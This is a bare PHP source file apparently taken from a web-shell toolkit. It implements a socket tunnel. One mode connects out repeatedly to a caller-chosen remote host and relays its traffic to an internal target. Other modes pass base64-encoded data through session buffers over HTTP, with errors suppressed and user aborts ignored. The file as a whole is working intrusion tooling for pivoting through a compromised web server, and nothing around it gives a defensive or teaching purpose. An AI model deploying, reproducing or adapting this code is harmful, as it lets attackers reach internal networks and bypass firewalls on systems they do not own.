@error_reporting(0);
function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remoteIP = "", $remotePort = "", $extraData = "")
{
    switch ($action) {
        case "createRemote":
            set_time_limit(0);
            //fastcgi_finish_request();
            @session_start();
            $_SESSION["remoteRunning"] = true;
            session_write_close();

            while (true && $_SESSION["remoteRunning"]) {


                $remoteSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                if ($remoteSocket === false) {
                    //echo "\x37\x21\x49\x36Failed creating socket";
                    continue;
                }
                $res = @socket_connect($remoteSocket, $remoteIP, $remotePort);
                if ($res === false) {
                    //echo "\x37\x21\x49\x36Failed connecting to remoteSocket";
                    continue;
                }
                $localPort = 0;
                if (socket_getsockname($remoteSocket, $sourceIp, $localPort) === false) {
                    $failReason = "socket_getsockname() failed: reason: " . socket_strerror(socket_last_error());
                }
                $localWriteBuf = socket_read($remoteSocket, 10240);
                if ($localWriteBuf === false) {
                    continue;
                } else {
                    $localSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                    if ($localSocket === false) {
                        echo "\x37\x21\x49\x36Failed creating socket";
                        return;
                    }
                    $res = @socket_connect($localSocket, $targetIP, $targetPort);
                    if ($res === false) {
                        echo "\x37\x21\x49\x36Failed connecting to target";
                        return;
                    }
                    socket_set_nonblock($remoteSocket);
                    socket_set_nonblock($localSocket);
                    $numOfWrite = socket_write($localSocket, $localWriteBuf, strlen($localWriteBuf));
                    if ($numOfWrite === false) {
                        //echo "\x37\x21\x49\x36Failed reading from localSocket";
                    }
                    $socklist = array($remoteSocket, $localSocket);
                    $nosocket = NULL;
                    $num_changed_sockets = socket_select($nosocket, $nosocket, $socklist, 0);

                    while (true && $_SESSION["remoteRunning"]) {
                        //fastcgi_finish_request();
                        file_put_contents("status.txt", "status:".$_SESSION["remoteRunning"]===false."\n", FILE_APPEND | LOCK_EX);
                        if ((socket_select($nosocket, $nosocket, $socklist, 0) == 0)) {
                        }
                        $localReadBuf = socket_read($localSocket, 10240);
                        if ($localReadBuf === false) {
                            //echo "\x37\x21\x49\x36Failed reading from localSocket";
                        } else {
                            $numOfRead = socket_write($remoteSocket, $localReadBuf, strlen($localReadBuf));
                            if ($numOfRead === false) {
                                //echo "\x37\x21\x49\x36Failed to write to remoteSocket";
                                //break;
                            }
                        };
                        $localWriteBuf = socket_read($remoteSocket, 10240);
                        if ($localWriteBuf === false) {
                            //echo "\x37\x21\x49\x36Failed reading from remoteSocket";

                            if (socket_last_error($remoteSocket) == 11) {
                                continue;
                            } else {
                                break;
                            }

                        } else {
                            $numOfWrite = socket_write($localSocket, $localWriteBuf, strlen($localWriteBuf));
                            if ($numOfWrite === false) {
                                //echo "\x37\x21\x49\x36Failed reading from localSocket";
                            }
                        }
                    }
                }
            }
            break;
        case "createLocal":
            $localSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            if ($localSocket === false) {
                echo "\x37\x21\x49\x36Failed creating socket";
                return;
            }
            $res = @socket_connect($localSocket, $targetIP, $targetPort);
            if ($res === false) {
                echo "\x37\x21\x49\x36Failed connecting to target" . $targetIP . ":" . $targetPort;
                return;
            }
            socket_set_nonblock($localSocket);
            @session_start();
            $_SESSION["local_running"] = true;
            $_SESSION["writebuf"] = "";
            $_SESSION["readbuf"] = "";
            ob_end_clean();
            header("Connection: close");
            ignore_user_abort();
            ob_start();
            $size = ob_get_length();
            header("Content-Length: $size");
            ob_end_flush();
            flush();
            session_write_close();

            while ($_SESSION["local_running"]) {
                $readBuff = "";
                @session_start();
                $writeBuff = $_SESSION["writebuf"];
                $_SESSION["writebuf"] = "";
                session_write_close();
                if ($writeBuff != "") {
                    $i = socket_write($localSocket, $writeBuff, strlen($writeBuff));
                    if ($i === false) {
                        @session_start();
                        $_SESSION["run"] = false;
                        session_write_close();
                        echo "\x37\x21\x49\x36Failed writing socket";
                    }
                }
                while ($o = socket_read($localSocket, 512)) {
                    if ($o === false) {
                        @session_start();
                        $_SESSION["local_running"] = false;
                        session_write_close();
                        echo "\x37\x21\x49\x36Failed reading from socket";
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != "") {
                    @session_start();
                    $_SESSION["readbuf"] .= $readBuff;
                    session_write_close();
                }
#sleep(0.2);
            }
            socket_close($localSocket);
            break;
        case "read":
            @session_start();
            $readBuffer = $_SESSION["readbuf"];
            $_SESSION["readbuf"] = "";
            $running = $_SESSION["local_running"];
            session_write_close();
            if ($running) {
                header("Connection: Keep-Alive");
                echo $readBuffer;
                return;
            } else {
                echo "\x37\x21\x49\x36RemoteSocket read filed";
                return;
            }
            break;
        case "write":
            {
                @session_start();
                $running = $_SESSION["local_running"];
                session_write_close();
                if (!$running) {
                    echo "\x37\x21\x49\x36No more running, close now";
                    return;
                }
                header('Content-Type: application/octet-stream');
                $rawPostData = base64_decode($extraData);
                if ($rawPostData) {
                    @session_start();
                    $_SESSION["writebuf"] .= $rawPostData;
                    session_write_close();
                    header("Connection: Keep-Alive");
                    return;
                } else {
                    echo "\x37\x21\x49\x36POST request read filed";
                }
            }
            break;
        case "closeLocal":
            @session_start();
            $running = $_SESSION["local_running"] = false;
            session_write_close();
            break;
        case "closeRemote":
            file_put_contents("status.txt", "close remote\n", FILE_APPEND | LOCK_EX);
            file_put_contents("status.txt", "status close 0:".$_SESSION["remoteRunning"]===false."\n", FILE_APPEND | LOCK_EX);
            @session_start();
            $_SESSION["remoteRunning"] = false;
            session_write_close();
            file_put_contents("status.txt", "status close 1:".$_SESSION["remoteRunning"]===false."\n", FILE_APPEND | LOCK_EX);
            break;
    }

}
